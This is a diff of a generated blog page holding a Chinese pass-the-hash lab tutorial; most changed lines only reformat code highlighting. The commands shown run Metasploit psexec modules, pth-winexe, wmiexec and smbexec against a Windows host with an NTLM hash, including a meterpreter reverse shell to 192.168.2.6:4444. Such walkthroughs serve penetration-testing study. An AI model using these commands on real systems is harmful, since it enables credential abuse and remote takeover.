@@ -127,7 +127,7 @@
             <section class="inner">
                 <section class="inner-main">
                     <div class="post">
-    <article id="post-ckwhbya2c002ts04z1a0r52hm" class="article article-type-post" itemscope
+    <article id="post-ckwrjlygv002xys4z24cebai8" class="article article-type-post" itemscope
     itemprop="blogPost">
 
     <div class="article-inner">
@@ -170,7 +170,7 @@
 
             
             <div class="article-busuanzi">
-                有 <span id="busuanzi_value_page_pv">N</span> 人看过
+                    有 <span id="busuanzi_value_page_pv">N</span> 人看过
             </div>
             
 
@@ -209,19 +209,34 @@
 <li><p>参数设置</p>
 </li>
 </ol>
-<pre><code><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use auxiliary/admin/smb/psexec_command</span><br><span class="line">msf &gt; <span class="built_in">set</span> rhosts <span class="number">192.168</span>.<span class="number">2.200</span></span><br><span class="line">msf &gt; <span class="built_in">set</span> smbdomain SHQAX</span><br><span class="line">msf &gt; <span class="built_in">set</span> smbuser administrator</span><br><span class="line">msf &gt; <span class="built_in">set</span> smbpass <span class="number">00000000000000000000000000000000</span>:<span class="number">7</span>c813560a8c4dd6423eaecb4f820ae1d</span><br><span class="line">msf &gt; <span class="built_in">set</span> command whoami</span><br><span class="line">msf &gt; <span class="built_in">set</span> verbose true</span><br><span class="line">msf &gt; run</span><br></pre></td></tr></table></figure>
+<pre><code><pre><code class="hljs powershell">msf &gt; use auxiliary/admin/smb/psexec_command
+msf &gt; <span class="hljs-built_in">set</span> rhosts <span class="hljs-number">192.168</span>.<span class="hljs-number">2.200</span>
+msf &gt; <span class="hljs-built_in">set</span> smbdomain SHQAX
+msf &gt; <span class="hljs-built_in">set</span> smbuser administrator
+msf &gt; <span class="hljs-built_in">set</span> smbpass <span class="hljs-number">00000000000000000000000000000000</span>:<span class="hljs-number">7</span>c813560a8c4dd6423eaecb4f820ae1d
+msf &gt; <span class="hljs-built_in">set</span> command whoami
+msf &gt; <span class="hljs-built_in">set</span> verbose true
+msf &gt; run</code></pre>
 </code></pre>
 <ol start="3">
 <li><p>执行结果<br> <img src="https://img-blog.csdnimg.cn/20210129144311983.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> 反向测试了下，windows server 2008 pth windows server2003, 其实是执行成功了，但是没回显，应该是文件读不到了，我猜是权限的问题，懂得大佬可以讲讲。<br> <img src="https://img-blog.csdnimg.cn/20210129144638843.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br> <img src="https://img-blog.csdnimg.cn/20210129144905129.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 <h4 id="方法二、psexec-psh"><a href="#方法二、psexec-psh" class="headerlink" title="方法二、psexec_psh"></a>方法二、psexec_psh</h4></li>
 <li><p>使用模块<code>exploit/windows/smb/psexec_psh</code></p>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msf <span class="operator">&gt;</span> use exploit<span class="operator">/</span>windows<span class="operator">/</span>smb<span class="operator">/</span>psexec_psh</span><br><span class="line">msf <span class="operator">&gt;</span> <span class="keyword">set</span> rhost <span class="number">192.168</span><span class="number">.2</span><span class="number">.200</span></span><br><span class="line">msf <span class="operator">&gt;</span> <span class="keyword">set</span> smbdomain SHQAX</span><br><span class="line">msf <span class="operator">&gt;</span> <span class="keyword">set</span> smbuser administrator</span><br><span class="line">msf <span class="operator">&gt;</span> <span class="keyword">set</span> smbpass <span class="number">00000000000000000000000000000000</span>:<span class="number">7</span>c813560a8c4dd6423eaecb4f820ae1d</span><br><span class="line">msf <span class="operator">&gt;</span> <span class="keyword">set</span> payload windows<span class="operator">/</span>x64<span class="operator">/</span>meterpreter<span class="operator">/</span>reverse_tcp_uuid</span><br><span class="line">msf <span class="operator">&gt;</span> <span class="keyword">set</span> lhost <span class="number">192.168</span><span class="number">.2</span><span class="number">.6</span></span><br><span class="line">msf <span class="operator">&gt;</span> <span class="keyword">set</span> lport <span class="number">4444</span></span><br><span class="line">msf <span class="operator">&gt;</span> run</span><br></pre></td></tr></table></figure></li>
+<pre><code class="hljs sql">msf <span class="hljs-operator">&gt;</span> use exploit<span class="hljs-operator">/</span>windows<span class="hljs-operator">/</span>smb<span class="hljs-operator">/</span>psexec_psh
+msf <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">set</span> rhost <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.200</span>
+msf <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">set</span> smbdomain SHQAX
+msf <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">set</span> smbuser administrator
+msf <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">set</span> smbpass <span class="hljs-number">00000000000000000000000000000000</span>:<span class="hljs-number">7</span>c813560a8c4dd6423eaecb4f820ae1d
+msf <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">set</span> payload windows<span class="hljs-operator">/</span>x64<span class="hljs-operator">/</span>meterpreter<span class="hljs-operator">/</span>reverse_tcp_uuid
+msf <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">set</span> lhost <span class="hljs-number">192.168</span><span class="hljs-number">.2</span><span class="hljs-number">.6</span>
+msf <span class="hljs-operator">&gt;</span> <span class="hljs-keyword">set</span> lport <span class="hljs-number">4444</span>
+msf <span class="hljs-operator">&gt;</span> run</code></pre></li>
 <li><p>执行命令getuid<br>这里试了好几次才成功，最后一次是吧domain改为大写，会挤掉原来的账户，还是要慎用。<br><img src="https://img-blog.csdnimg.cn/20210129151036365.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p>
 </li>
 </ol>
 <h2 id="四、使用kali工具进行PTH"><a href="#四、使用kali工具进行PTH" class="headerlink" title="四、使用kali工具进行PTH"></a>四、使用kali工具进行PTH</h2><ol>
 <li><p>工具位置：<br><img src="https://img-blog.csdnimg.cn/2021012915170771.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>2、简单使用</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pth-winexe -U SHQAX/administrator%00000000000000000000000000000000:7c813560a8c4dd6423eaecb4f820ae1d --system --ostype=1 //192.168.2.200 cmd</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">pth-winexe -U SHQAX/administrator%00000000000000000000000000000000:7c813560a8c4dd6423eaecb4f820ae1d --system --ostype=1 //192.168.2.200 cmd</code></pre>
 
 <p><img src="https://img-blog.csdnimg.cn/20210129152131405.png" alt="在这里插入图片描述"></p>
 </li>
@@ -231,9 +246,9 @@
 <p> <strong>python</strong> repo:<a target="_blank" rel="noopener" href="https://github.com/SecureAuthCorp/impacket">https://github.com/SecureAuthCorp/impacket</a></p>
 </li>
 <li><p>简单使用</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wmiexec -hashes 00000000000000000000000000000000:7c813560a8c4dd6423eaecb4f820ae1d SHQAX/administrator@192.168.2.200 <span class="string">&quot;whoami&quot;</span></span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">wmiexec -hashes 00000000000000000000000000000000:7c813560a8c4dd6423eaecb4f820ae1d SHQAX/administrator@192.168.2.200 <span class="hljs-string">&quot;whoami&quot;</span></code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20210129154427330.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzM4OTYzMjQ2,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"><br>利用smbexec反弹shell：</p>
-<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">smbexec -hashes 00000000000000000000000000000000:7c813560a8c4dd6423eaecb4f820ae1d SHQAX/administrator@192.168.2.200</span><br></pre></td></tr></table></figure>
+<pre><code class="hljs bash">smbexec -hashes 00000000000000000000000000000000:7c813560a8c4dd6423eaecb4f820ae1d SHQAX/administrator@192.168.2.200</code></pre>
 <p><img src="https://img-blog.csdnimg.cn/20210129154627615.png" alt="在这里插入图片描述"></p>
 </li>
 </ol>
